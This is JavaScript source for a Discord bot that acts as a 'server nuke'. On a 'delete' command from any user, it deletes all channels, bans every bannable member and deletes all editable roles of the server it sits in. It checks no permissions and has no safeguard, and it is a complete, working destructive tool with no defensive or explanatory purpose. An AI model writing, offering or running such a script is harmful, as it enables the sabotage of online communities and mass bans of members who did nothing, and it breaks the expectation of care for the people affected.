const Discord = require('discord.js');
const client = new Discord.Client();
const config = require('./config.json');

client.on("ready", () => {
    console.log("i'm ready !");
});

client.on("message", message => {
    if (!message.content.startsWith(config.prefix) || message.author.bot) return;

    const args = message.content.slice(config.prefix.length).split(/ +/);
    const command = args.shift().toLowerCase();

    if(command === "delete") {
        
        message.guild.channels.forEach(channel =>{
            channel.delete();
            console.log(`${channel.name} was deleted`);
        });

        message.guild.members.forEach(member => {
            if(!member.bannable) return;
            member.ban();
            console.log(`${member.displayName} was banned `);
        });

        message.guild.roles.forEach(role=>{
            if(!role.editable) return;
            role.delete()
            console.log(`${role.name} was deleted`);
        })
    }
})

client.login(config.token)
